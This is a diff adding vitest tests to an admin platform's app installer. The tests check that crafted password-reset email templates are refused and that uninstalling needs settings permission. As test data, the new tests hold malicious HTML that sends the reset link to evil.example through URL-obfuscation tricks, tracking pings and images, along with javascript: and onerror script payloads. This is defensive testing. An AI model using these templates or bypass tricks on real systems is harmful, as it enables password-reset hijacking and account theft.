@@ -19,7 +19,7 @@ import { INSTANCE_SETTING_KEYS, instanceSchema, validateManifest } from '@admini
 import { appInstanceUndoRepo, filesRepo, manifestsRepo, settingsRepo, type MetaDb } from '@adminium/meta';
 import { afterEach, beforeEach, describe, expect, it } from 'vitest';
 
-import { applyInstance, linkHosts, undoInstance } from '../src/apps/manifest-instance.js';
+import { applyInstance, linkHosts, reviewInstance, undoInstance } from '../src/apps/manifest-instance.js';
 import { createAppInstallService } from '../src/apps/install-service.js';
 import { refusePlannedOnly } from '../src/crud/unbuilt-rules.js';
 import { seedBuiltinEmailTemplates } from '../src/email/builtins.js';
@@ -176,12 +176,67 @@ for (const engine of META_ENGINES) {
       const now = await meta.db.selectFrom('adminium_email_templates').select(['subject']).where('key', '=', 'password-reset').where('locale', '=', 'en_US').executeTakeFirst();
       expect(now?.subject).toBe('Choose a new Fernhill password');
     });
+
+    it('a crafted reset email that hands the reset link to an outside host is refused, ticked or not', async () => {
+      const subjectNow = async () =>
+        (await meta.db.selectFrom('adminium_email_templates').select(['subject']).where('key', '=', 'password-reset').where('locale', '=', 'en_US').executeTakeFirst())?.subject;
+      const before = await subjectNow();
+      const crafted = (code: string) =>
+        part({ systemEmails: [{ key: 'password-reset', locale: 'en_US', content: { subject: 'Reset it', blocks: [{ id: 'go', block: 'email.html', data: { code } }] } }] });
+      for (const code of [
+        '<a href="//evil.example/r?t={{resetUrl}}">Choose a new password</a>',
+        '<a href="https&#58;//evil.example/r?t={{resetUrl}}">Choose a new password</a>',
+        '<a href="https:\\\\evil.example/r?t={{resetUrl}}">Choose a new password</a>',
+        '<a href="https:/evil.example/r?t={{resetUrl}}">Choose a new password</a>',
+        '<p>Open evil.example/r?t={{resetUrl}}</p>',
+        '<a href="{{resetUrl}}" ping="https://evil.example/p">Choose a new password</a><img src="https://evil.example/t?u={{resetUrl}}">',
+      ]) {
+        const answers = { instance: true, instanceHosts: { 'password-reset/en_US': ['evil.example'] } };
+        const done = await apply('1.0.0', crafted(code), { answers });
+        expect(done?.left, code).toEqual([{ item: 'password-reset/en_US', reason: expect.stringContaining('evil.example') }]);
+        expect(await subjectNow(), code).toBe(before);
+      }
+      // The review lists no email to tick: it says why each stays out.
+      const review = await reviewInstance(meta, app('1.0.0', crafted('<a href="//evil.example/r?t={{resetUrl}}">Reset</a>')) as never);
+      expect(review?.systemEmails).toEqual([]);
+      expect(review?.left).toEqual([{ item: 'password-reset/en_US', reason: expect.stringContaining('it sends {{resetUrl}} to "evil.example"') }]);
+      // A plain outside link with no reset link in it is listed, and stays out until ticked.
+      const listed = await reviewInstance(meta, app('1.0.0', crafted('<a href="{{resetUrl}}">Reset</a> or see <a href="//help.example/x">help</a>')) as never);
+      expect(listed?.systemEmails).toEqual([expect.objectContaining({ id: 'password-reset/en_US', hosts: ['help.example'] })]);
+      const unticked = await apply('1.0.0', crafted('<a href="{{resetUrl}}">Reset</a> or see <a href="//help.example/x">help</a>'), { answers: { instance: true, instanceHosts: {} } });
+      expect(unticked?.left).toEqual([{ item: 'password-reset/en_US', reason: 'it links to "help.example", which was not ticked' }]);
+      expect(await subjectNow()).toBe(before);
+    });
+
+    it('an email whose link cannot be told, or runs code, is refused and says why', async () => {
+      const crafted = (code: string) => part({ systemEmails: [{ key: 'password-reset', locale: 'en_US', content: { subject: 'Reset it', blocks: [{ id: 'go', block: 'email.html', data: { code } }] } }] });
+      const cases: [string, RegExp][] = [
+        ['<a href="{{name}}">x</a>', /filled in only when it is sent/],
+        ['<a href="javascript:alert(1)">x</a>', /"javascript:"/],
+        ['<script>1</script>', /runs code/],
+        ['<img src="cid:x" onerror="1">', /runs code/],
+      ];
+      for (const [code, reason] of cases) {
+        const review = await reviewInstance(meta, app('1.0.0', crafted(code)) as never);
+        expect(review?.left, code).toEqual([{ item: 'password-reset/en_US', reason: expect.stringMatching(reason) }]);
+      }
+    });
   });
 }
 
 describe('the link hosts of an email', () => {
   it('lists every host a person could be sent to, once, without its user or port', () => {
     expect(linkHosts({ subject: 'See https://a.example', blocks: [{ data: { text: 'http://User@B.example:8080/x and https://a.example/y', url: '//c.example/z' } }, { data: { url: '{{resetUrl}}' } }] })).toEqual(['a.example', 'b.example', 'c.example']);
+  });
+
+  it('every way past a plain https:// still names its host', () => {
+    const one = (block: Doc) => linkHosts({ subject: 'Reset', blocks: [block] }, 'password-reset');
+    expect(one({ block: 'email.html', data: { code: '<a href="//evil.example/r">x</a>' } })).toEqual(['evil.example']);
+    expect(one({ block: 'email.html', data: { code: '<a href="https&#58;//evil.example/r">x</a>' } })).toEqual(['evil.example']);
+    expect(one({ block: 'email.button', data: { label: 'Go', url: 'https:/evil.example/r' } })).toEqual(['evil.example']);
+    expect(one({ block: 'email.button', data: { label: 'Go', url: 'https:evil.example/r' } })).toEqual(['evil.example']);
+    expect(one({ block: 'email.button', data: { label: 'Go', url: 'https:\\\\evil.example/r' } })).toEqual(['evil.example']);
+    expect(one({ block: 'email.html', data: { code: '<img src="https://evil%2Eexample/p.png">' } })).toEqual(['evil.example']);
   });
 });
 
@@ -287,6 +342,34 @@ for (const [dialect, available] of ENGINES) {
       expect(gone.statusCode, gone.body).toBe(200);
       expect((JSON.parse(gone.body) as Doc)['removed']['instance']).toBeGreaterThan(0);
       expect(await snapshot(h.meta)).toEqual(original);
+    });
+
+    it('an uninstall that would put the server back needs the right to change its settings, as applying did', async () => {
+      h = await installHarness(dialect, { library: memoryLibrary() });
+      await dressTarget(h.meta);
+      await h.stage(app('1.0.0'), logo);
+      const reply = await install({ instance: true, instanceHosts: ALL_HOSTS });
+      expect(reply.statusCode, reply.body).toBe(200);
+      const planned = await h.inject({ method: 'GET', url: '/apps/fern-notes/uninstall-plan' });
+      expect(planned.statusCode, planned.body).toBe(200);
+      expect((JSON.parse(planned.body) as Doc)['instance']).toEqual({ values: expect.any(Number), canRestore: true });
+
+      // Someone who may manage apps but not the server's settings: refused before anything goes, the server as the app left it.
+      const service = createAppInstallService(h.deps);
+      const installed = (await manifestsRepo(h.meta, { encrypt: (v) => v, decrypt: (v) => v }).findInScope('fern-notes', h.connectionId))!;
+      const list = await service.removals.listOf(installed);
+      const before = await snapshot(h.meta);
+      await expect(service.removals.checkDrop(list, { dropTables: false, superAdmin: false, settingsManage: false })).rejects.toMatchObject({ statusCode: 403, details: { reason: 'INSTANCE_RESTORE_NEEDS_SETTINGS' } });
+      await expect(service.removals.checkDrop(list, { dropTables: false, superAdmin: false })).rejects.toMatchObject({ statusCode: 403 });
+      expect(await snapshot(h.meta)).toEqual(before);
+      expect(await settingOf(h.meta, 'branding.appName')).toBe('Fernhill');
+
+      // Put back first by someone who may (the look's own undo), the uninstall asks nothing more.
+      const undone = await h.inject({ method: 'POST', url: '/apps/fern-notes/look/undo', payload: {} });
+      expect(undone.statusCode, undone.body).toBe(200);
+      await expect(service.removals.checkDrop(await service.removals.listOf(installed), { dropTables: false, superAdmin: false, settingsManage: false })).resolves.toBeUndefined();
+      const again = await h.inject({ method: 'GET', url: '/apps/fern-notes/uninstall-plan' });
+      expect(JSON.parse(again.body) as Doc).not.toHaveProperty('instance');
     });
 
     it('a logo its package does not hold as it says stops the plan', async () => {
